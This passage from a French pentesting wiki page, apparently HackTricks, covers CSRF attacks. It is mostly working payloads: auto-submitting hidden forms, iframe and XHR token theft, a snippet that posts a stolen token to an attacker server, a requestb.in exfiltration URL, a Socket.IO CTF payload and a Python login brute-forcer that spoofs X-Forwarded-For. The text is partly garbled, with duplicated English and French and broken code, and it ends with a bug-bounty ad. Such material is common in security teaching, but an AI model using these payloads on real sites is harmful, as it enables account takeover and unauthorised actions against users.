Une autre méthode consiste à utiliser un formulaire pour envoyer la requête POST malveillante. L'attaquant crée un formulaire caché dans une page Web et définit l'URL de la cible comme la cible de l'action du formulaire. Ensuite, l'attaquant utilise JavaScript pour remplir le formulaire avec les données nécessaires, y compris le jeton CSRF volé, et soumet le formulaire automatiquement.

```html
<form action="https://www.example.com/target-page" method="POST" id="csrf-form">
  <input type="hidden" name="csrf_token" value="TOKEN_VALUE">
  <!-- Autres champs de formulaire nécessaires -->
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
```

#### **4. Envoi d'une requête POST avec Ajax**

Enfin, l'attaquant peut utiliser Ajax pour envoyer la requête POST malveillante. L'attaquant crée une requête Ajax en utilisant JavaScript et définit l'URL de la cible, les données à envoyer (y compris le jeton CSRF volé) et la méthode POST. Ensuite, l'attaquant envoie la requête Ajax pour exécuter l'attaque CSRF.

```javascript
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://www.example.com/target-page', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('csrf_token=TOKEN_VALUE&other_data=DATA_VALUE');
```

Il est important de noter que ces méthodes d'attaque CSRF peuvent être détectées et prévenues en utilisant des techniques de défense appropriées, telles que l'utilisation de jetons CSRF avec des durées de validité courtes, la vérification de l'en-tête Referer, l'utilisation de cookies sécurisés et l'implémentation de mécanismes de confirmation de l'action de l'utilisateur.
```markup
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Vol de jeton CSRF et envoi d'une requête POST à l'aide d'un iframe et d'un formulaire**

To perform a Cross-Site Request Forgery (CSRF) attack, an attacker needs to steal the victim's CSRF token and use it to send unauthorized requests on behalf of the victim. One way to achieve this is by using an iframe and a form.

Pour effectuer une attaque de falsification de requête entre sites (CSRF), un attaquant doit voler le jeton CSRF de la victime et l'utiliser pour envoyer des requêtes non autorisées au nom de la victime. Une façon d'y parvenir est d'utiliser un iframe et un formulaire.

1. The attacker creates a malicious webpage that contains an iframe pointing to the target website.

   L'attaquant crée une page web malveillante contenant un iframe pointant vers le site cible.

   ```html
   <iframe src="https://www.target-website.com"></iframe>
   ```

2. The attacker also includes a hidden form within the iframe, pre-filled with the victim's CSRF token and the desired malicious action.

   L'attaquant inclut également un formulaire caché dans l'iframe, pré-rempli avec le jeton CSRF de la victime et l'action malveillante souhaitée.

   ```html
   <form action="https://www.target-website.com/action" method="POST">
     <input type="hidden" name="csrf_token" value="victim-csrf-token">
     <input type="hidden" name="action" value="malicious-action">
   </form>
   ```

3. When the victim visits the attacker's webpage, the iframe loads the target website, and the hidden form is automatically submitted.

   Lorsque la victime visite la page web de l'attaquant, l'iframe charge le site cible et le formulaire caché est automatiquement soumis.

4. Since the form is submitted within the context of the target website, the victim's browser includes the victim's CSRF token in the request, making it appear legitimate.

   Étant donné que le formulaire est soumis dans le contexte du site cible, le navigateur de la victime inclut le jeton CSRF de la victime dans la requête, ce qui la rend légitime en apparence.

5. The target website processes the request, unaware that it was initiated by the attacker, and performs the malicious action on behalf of the victim.

   Le site cible traite la requête, sans se rendre compte qu'elle a été initiée par l'attaquant, et effectue l'action malveillante au nom de la victime.

By exploiting the trust between the victim's browser and the target website, an attacker can use CSRF attacks to perform unauthorized actions, such as changing account settings, making purchases, or even deleting data.

En exploitant la confiance entre le navigateur de la victime et le site cible, un attaquant peut utiliser des attaques CSRF pour effectuer des actions non autorisées, telles que modifier les paramètres du compte, effectuer des achats ou même supprimer des données.
```markup
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Vol de jeton et envoi via 2 iframes**

To perform a Cross-Site Request Forgery (CSRF) attack, one common technique is to steal the victim's authentication token and send it using two iframes. This attack can be executed by injecting malicious code into a vulnerable website.

Here's how the attack works:

1. The attacker creates a malicious website that contains two hidden iframes.
2. The first iframe is used to load the target website, where the victim is authenticated.
3. The second iframe is used to send a request to a specific endpoint on the target website, using the stolen authentication token.
4. The request made by the second iframe can perform actions on behalf of the victim, such as changing their password, making a purchase, or deleting their account.

By stealing the victim's authentication token and using it in the second iframe, the attacker can trick the target website into performing actions without the victim's knowledge or consent.

To protect against CSRF attacks, websites should implement measures such as using anti-CSRF tokens, validating the origin of requests, and implementing strict access controls.
```markup
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTSteal CSRF token with Ajax and send a post with a form**

### **POSTVoler le jeton CSRF avec Ajax et envoyer une requête POST avec un formulaire**

To perform a Cross-Site Request Forgery (CSRF) attack, an attacker needs to steal the CSRF token from the target website and then use it to send malicious requests on behalf of the victim.

Pour effectuer une attaque de falsification de requête entre sites (CSRF), un attaquant doit voler le jeton CSRF du site cible, puis l'utiliser pour envoyer des requêtes malveillantes au nom de la victime.

One way to steal the CSRF token is by using Ajax to make a GET request to the target website and extract the token from the response.

Une façon de voler le jeton CSRF consiste à utiliser Ajax pour effectuer une requête GET vers le site cible et extraire le jeton de la réponse.

```javascript
$.ajax({
    url: 'https://target-website.com',
    type: 'GET',
    success: function(response) {
        var csrfToken = $(response).find('input[name="csrf_token"]').val();
        // Send the stolen CSRF token to the attacker's server
        $.post('https://attacker-server.com', { token: csrfToken });
    }
});
```

```javascript
$.ajax({
    url: 'https://site-cible.com',
    type: 'GET',
    success: function(response) {
        var csrfToken = $(response).find('input[name="csrf_token"]').val();
        // Envoyer le jeton CSRF volé au serveur de l'attaquant
        $.post('https://serveur-de-lattaquant.com', { token: csrfToken });
    }
});
```

Once the attacker has obtained the CSRF token, they can use it to craft a malicious POST request and submit it using a form.

Une fois que l'attaquant a obtenu le jeton CSRF, il peut l'utiliser pour créer une requête POST malveillante et la soumettre à l'aide d'un formulaire.

```html
<form action="https://target-website.com" method="POST">
    <input type="hidden" name="csrf_token" value="stolen_token">
    <!-- Add other form fields and malicious data here -->
    <input type="submit" value="Submit">
</form>
```

```html
<form action="https://site-cible.com" method="POST">
    <input type="hidden" name="csrf_token" value="jeton_vole">
    <!-- Ajouter d'autres champs de formulaire et des données malveillantes ici -->
    <input type="submit" value="Soumettre">
</form>
```

By including the stolen CSRF token in the form as a hidden input field, the attacker can trick the victim's browser into submitting the form without their knowledge.

En incluant le jeton CSRF volé dans le formulaire en tant que champ de saisie masqué, l'attaquant peut tromper le navigateur de la victime pour qu'il soumette le formulaire sans son consentement.

It is important for web developers to implement proper CSRF protection mechanisms, such as using unique and unpredictable tokens for each user session, to prevent these types of attacks.

Il est important que les développeurs web mettent en place des mécanismes de protection CSRF appropriés, tels que l'utilisation de jetons uniques et imprévisibles pour chaque session utilisateur, afin de prévenir ce type d'attaques.
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF avec Socket.IO

Socket.IO est une bibliothèque JavaScript qui permet la communication en temps réel entre le serveur et le client. Elle est souvent utilisée dans les applications web pour créer des fonctionnalités en temps réel telles que les chats en direct ou les mises à jour en direct.

Cependant, Socket.IO peut également être vulnérable aux attaques de falsification de requête intersite (CSRF). Une attaque CSRF se produit lorsque le navigateur d'un utilisateur authentifié envoie une requête non autorisée à un site web sans que l'utilisateur en soit conscient.

Pour exploiter une vulnérabilité CSRF avec Socket.IO, un attaquant peut utiliser une page web malveillante pour envoyer une requête WebSocket à un serveur Socket.IO. Cette requête peut contenir des instructions malveillantes qui seront exécutées par le serveur.

Pour se protéger contre les attaques CSRF avec Socket.IO, il est recommandé d'utiliser des jetons anti-CSRF. Ces jetons sont générés par le serveur et inclus dans les requêtes WebSocket. Le serveur vérifie ensuite si le jeton est valide avant de traiter la requête.

En utilisant des jetons anti-CSRF, les développeurs peuvent s'assurer que seules les requêtes légitimes provenant de leur propre site web sont autorisées à interagir avec le serveur Socket.IO. Cela réduit considérablement le risque d'attaques CSRF.

Il est important de noter que la mise en place de jetons anti-CSRF ne garantit pas une protection complète contre les attaques CSRF. D'autres mesures de sécurité, telles que la validation côté serveur des données reçues, doivent également être mises en place pour renforcer la sécurité de l'application web.
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## Brute Force de connexion CSRF

Le code peut être utilisé pour effectuer une attaque de force brute sur un formulaire de connexion en utilisant un jeton CSRF (il utilise également l'en-tête X-Forwarded-For pour tenter de contourner un éventuel blocage d'adresse IP) :
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Outils <a href="#outils" id="outils"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Références

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

​

<figure><img src="../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme des primes pour les bugs de cryptographie.**

**Obtenez des récompenses sans délai**\
Les primes HackenProof sont lancées uniquement lorsque les clients déposent le budget de récompense. Vous recevrez la récompense après la vérification du bug.

**Acquérez de l'expérience en pentesting web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Maîtrisez la sécurité web3 dès ses débuts.

**Devenez une légende du hacking web3**\
Gagnez des points de réputation avec chaque bug vérifié et conquérez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez à gagner grâce à vos hacks !

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Vous travaillez dans une **entreprise de cybersécurité** ? Vous souhaitez voir votre **entreprise annoncée dans HackTricks** ? ou souhaitez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
